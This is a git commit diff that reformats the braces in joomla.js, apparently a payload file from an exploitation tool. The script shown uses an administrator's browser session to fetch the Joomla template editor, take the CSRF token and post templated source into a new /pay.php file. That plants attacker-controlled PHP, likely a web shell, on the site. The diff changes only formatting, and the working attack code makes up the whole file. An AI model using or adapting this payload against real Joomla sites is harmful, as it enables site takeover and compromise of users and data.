4db03505867178b3118057b8850ff0f9b4e904ec
James Corley <JCorley111@gmail.com>
2016-06-29 11:32:20 -0400

    Update joomla.js

--- joomla.js
+++ joomla.js
@@ -1,5 +1,4 @@
-function httpGet(theUrl)
-{
+function httpGet(theUrl) {
     var xmlHttp = null;
 
     xmlHttp = new XMLHttpRequest();
@@ -10,23 +9,18 @@ function httpGet(theUrl)
 
 var page = httpGet("%s/administrator/index.php?option=com_templates&view=template&id=507&file=L3BheS5waHA=");
 
-function httpPost(theUrl, csrftoken)
-{
+function httpPost(theUrl, csrftoken) {
     var xmlHttp = null;
 
     xmlHttp = new XMLHttpRequest();
     xmlHttp.open( "POST", theUrl, false );
     xmlHttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
-    if (csrftoken == "null")
-    {
+    if (csrftoken == "null") {
         xmlHttp.send("type=php&name=pay&address=");
-    }
-    else
-    {
+    } else {
         xmlHttp.send("jform[source]=%s&task=template.apply&" + csrftoken + "=1&jform[extension_id]=507&jform[filename]=/pay.php");
     }
     return xmlHttp.responseText;
-
 }
 
 csrftoken = "null";
